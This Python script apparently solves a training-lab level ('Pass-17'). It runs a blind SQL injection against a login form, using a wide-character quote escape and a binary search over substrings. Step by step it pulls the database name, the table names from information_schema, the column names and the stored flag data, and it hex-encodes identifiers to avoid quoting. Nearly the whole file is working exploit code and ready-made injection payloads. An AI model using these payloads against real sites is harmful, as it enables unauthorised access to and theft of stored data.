import time
from requests_html import AsyncHTMLSession, HTMLSession

url = 'http://inject2.lab.aqlab.cn:81/Pass-17/index.php'
flag_success = '成功登录'

payload1_database_length = '汉\') or length(database())={}#'
payload_database = '汉\') or ord(substr(database(),{},1))>{}#'
payload_table = '汉\') or ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}#'
payload_column = '汉\') or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name={}),{},1))>{}#'
payload_data = '汉\') or ord( SUBSTR((select group_concat({}) from {}),{},1))>{}#'

key = "username"

start_time = time.time()

session = HTMLSession()
proxies = {}


def go(title, payload):
    db = ''
    for i in range(1, 128):
        s = search(i, payload)
        if not 32 < ord(s) <= 128:
            break
        db += s
        print(f'{title} = ', db)


def search(index, payload):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        data = {
            key: payload.format(index, mid),
            'password': '',
        }
        res = session.post(url, data=data)
        if flag_success in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

        if mid == 32:
            break
    return chr(mid)


def h(txt):
    return '0x' + txt.encode().hex()


if __name__ == '__main__':
    table_name = 'china_flag'  # 这里用16进制绕过，需要去掉两侧""
    column_name = 'C_Flag'

    # go('database', payload_database)  # 'widechar'
    # go('table', payload_table)  # 'china_flag'
    # go('column', payload_column.format(h(table_name), '{}', '{}'))  # Id,C_Flag
    go('data', payload_data.format(column_name, table_name, '{}', '{}'))
    print("--- %s seconds ---" % (time.time() - start_time))
